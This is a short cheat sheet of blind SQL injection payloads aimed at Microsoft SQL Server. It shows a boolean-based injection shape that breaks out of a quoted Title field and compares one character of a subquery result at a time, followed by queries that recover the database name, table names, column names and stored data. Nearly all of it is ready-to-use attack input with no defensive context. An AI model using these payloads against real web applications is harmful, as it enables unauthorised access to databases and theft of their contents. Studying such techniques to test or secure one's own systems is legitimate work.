# Shape
select * from board where Title='//' and substring((query), 1, 1) < 'a'--
???' and substring((query), 1, 1) < 'a'--

# get DB NAME
db_name()

# Get Table name
select top 1 name from sysobjects where xtype='U'

# Get Column name
select top 1 column_name from information_schema.columns where table_name = '[Table Name]'

# Get Data
select top 1 [Column Name] from [Table Name]
